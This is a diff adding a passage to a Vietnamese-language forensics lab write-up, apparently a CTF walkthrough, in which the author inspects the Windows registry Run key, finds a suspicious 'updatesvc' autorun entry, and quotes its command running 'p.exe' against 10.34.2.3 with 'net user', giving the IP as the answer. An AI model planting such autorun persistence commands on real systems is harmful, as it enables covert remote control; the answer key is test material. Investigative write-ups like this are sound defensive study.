@@ -83,4 +83,22 @@ vì câu này hỏi riêng thời gian đăng nhập cuối của john, nên em 
 ```
 03/02/2019 5:48:32 PM
 ```
+đầu tiên em vào regedit
+
+sau đó em tìm đến đường dẫn ```hkey_local_machine\software\microsoft\windows\currentversion\run```để xem các chương trình tự động chạy cùng hệ thống
+
+tại đây em thấy một key tên là updatesvc rất đáng nghi
+
+nhìn sang cột data của nó em thấy chuỗi lệnh c:\tmp\p.exe -s \\10.34.2.3 'net user' > c:\tmp\o...
+
+<img width="1919" height="988" alt="image" src="https://github.com/user-attachments/assets/151819f3-b674-474c-bef0-19765c0bf7f8" />
+
+kẻ tấn công đã giấu lệnh ở đây để máy tính tự động kết nối đến ip 10.34.2.3 mỗi khi vừa khởi động
+
+từ chuỗi này em lấy được ip cần tìm
+
+đáp án
+```10.34.2.3```
+
+câu 5
 
